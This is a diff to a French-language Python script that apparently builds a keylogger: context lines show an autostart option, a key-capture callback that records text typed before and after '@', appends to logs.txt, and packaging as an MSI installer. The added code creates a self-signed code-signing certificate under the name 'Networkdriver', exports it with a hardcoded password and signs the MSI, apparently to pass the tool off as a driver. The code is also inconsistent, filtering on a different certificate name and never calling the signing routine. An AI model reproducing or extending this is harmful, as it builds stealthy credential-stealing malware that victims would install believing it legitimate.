@@ -125,6 +125,7 @@ def autostart_option_func():
     print("Option autostart activée")
 
 
+
 def capture_before_after_at_option_func():
     def touche(key):
         global historique, capture_apres_at, apres_at_buffer, compteur
@@ -334,6 +335,8 @@ def msi():
 
     setup_filename = "setup_msi_temp.py"
 
+
+
     # Création du fichier setup pour cx_Freeze
     with open(setup_filename, "w", encoding="utf-8") as f:
         f.write(
@@ -383,7 +386,55 @@ def msi():
     if os.path.exists("dist"):
         shutil.rmtree("dist")
 
-    messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
+    def generer_certificat_auto():
+        # Génère un certificat auto-signé
+        cmd = [
+            "powershell", "-Command",
+            'New-SelfSignedCertificate -Type CodeSigning -Subject "CN=Networkdriver" -CertStoreLocation "Cert:\\CurrentUser\\My"'
+        ]
+        subprocess.run(cmd, capture_output=True, text=True)
+
+    def exporter_certificat_pfx(pfx_path, password):
+        cmd = [
+            "powershell", "-Command",
+            f'$pwd = ConvertTo-SecureString -String "{password}" -Force -AsPlainText; '
+            '$cert = Get-ChildItem Cert:\\CurrentUser\\My | Where-Object {{ $_.Subject -eq "CN=MonLogiciel" }}; '
+            f'Export-PfxCertificate -Cert $cert -FilePath "{pfx_path}" -Password $pwd'
+        ]
+        subprocess.run(cmd, capture_output=True, text=True)
+
+    def signer_msi(msi_path, pfx_path, password):
+        cmd = [
+            "signtool", "sign",
+            "/f", pfx_path,
+            "/p", password,
+            "/fd", "SHA256",
+            "/v",
+            msi_path
+        ]
+        return subprocess.run(cmd, capture_output=True, text=True)
+
+
+    def signer_msi_auto(msi_file_path):
+        pfx_path = os.path.expanduser("~/moncert.pfx")
+        password = "motdepasse123"  # Mets ce que tu veux
+
+        # 1️⃣ Génération certificat
+        generer_certificat_auto()
+
+        # 2️⃣ Export PFX
+        exporter_certificat_pfx(pfx_path, password)
+
+        # 3️⃣ Signature MSI
+        result = signer_msi(msi_file_path, pfx_path, password)
+
+        if result.returncode == 0:
+            messagebox.showinfo("Succès", "Le MSI a été signé automatiquement avec un certificat auto-signé !")
+        else:
+            messagebox.showerror("Erreur", f"Échec de la signature :\n{result.stderr}")
+
+
+        messagebox.showinfo("Succès", f"✅ MSI créé dans {output_dir}/, prêt à l'installation !")
 
 
 # ---------------- INTERFACE ----------------
@@ -463,4 +514,3 @@ with open("logs.txt", "a") as fichier:
 
 def key():
     app.mainloop()
-
